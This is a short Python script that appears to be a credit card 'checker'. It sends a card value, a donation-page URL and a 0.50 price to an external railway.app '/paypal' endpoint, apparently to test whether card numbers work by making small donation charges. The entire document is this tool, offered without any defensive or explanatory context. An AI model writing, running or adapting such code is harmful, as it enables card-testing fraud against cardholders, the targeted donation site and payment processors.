import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://ls26f.org/donations/63/"
	price="0.50"
	res=requests.get(f'https://pqy2-production.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
	return res
